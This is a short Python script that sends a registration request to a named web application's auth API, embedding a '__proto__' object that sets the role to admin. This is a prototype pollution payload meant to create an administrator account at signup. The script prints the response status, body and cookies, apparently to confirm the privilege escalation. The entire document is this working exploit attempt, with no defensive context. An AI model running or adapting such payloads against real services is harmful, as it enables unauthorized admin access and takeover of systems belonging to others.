import requests

url = "https://deploylite.g24sec.space/api/auth/register"
headers = {"Content-Type": "application/json"}
data = '{"email":"testadmin3@example.com", "username":"testadmin3", "password":"password123", "__proto__": {"role": "admin"}}'

response = requests.post(url, headers=headers, data=data)
print(response.status_code)
print(response.text)
print(response.cookies)
